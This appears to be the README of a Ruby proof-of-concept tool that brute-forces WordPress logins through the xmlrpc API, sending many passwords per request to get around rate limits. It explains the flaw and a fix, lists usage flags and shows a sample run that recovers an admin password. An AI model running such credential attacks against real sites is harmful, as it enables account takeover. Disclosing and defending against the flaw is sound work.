# Wordpress Bruteforcer
This is a rough POC that demonstrates the recent amplified bruteforce attack on wordpress based website via `xmlrpc` API. 

# Issue
This particular vulnerability allows an attacker to bypass webserver rate limits. Instead of the attacker sending one query with a one password, he or she can now send one query with 500 passwords via `xmlrpc` API. 

##### Classic Bruteforce
```
Attacker                          WP Server
|----password1---------------------------->
<---------------------------------nope----|
|----password2---------------------------->
<---------------------------------nope----|
|----password3---------------------------->
<---------------------------rate-limit----|
|----password4---------------------------->
<---------------------------rate-limit----|
|----password5---------------------------->
<---------------------------rate-limit----|
|----password6---------------------------->
<----------------------------------yes----|
```

##### Amplified Bruteforce
```
Attacker                          WP Server
|----p1,p2,p3,p4,p5,p6-------------------->
<---------nope,nope,nope,nope,nope,yes----|
```

# Fix 
Block the `xmlrpc.php` access from the configuration files like `.htaccess` or `nginx.conf`

# Usage
```
ruby ./wpbrute-rpc.rb --url=[...] --user=[...] --count=[...] --list=[...]
   --url     The wordpress RPC endpoint.
   --user    The username you would like to bruteforce.
   --count   The number of attempts per RPC request.
   --list    The path to your password dictionary.

== More Info ==
* Ensure that the website is active, has the correct protocol (http or https), and ends in 'xmlrpc.php'.
* The wordlist should just be a list of word seperated by the new-line character.
* If you get a 'Parse error' then your count is too high.
```

##### Live Example
```
bundle install
ruby ./wpbrute-rpc.rb --url="https://wp.example.com/xmlrpc.php" --user=admin --count=500 --list=./500-worst-passwords.txt

Password found!
> admin

```
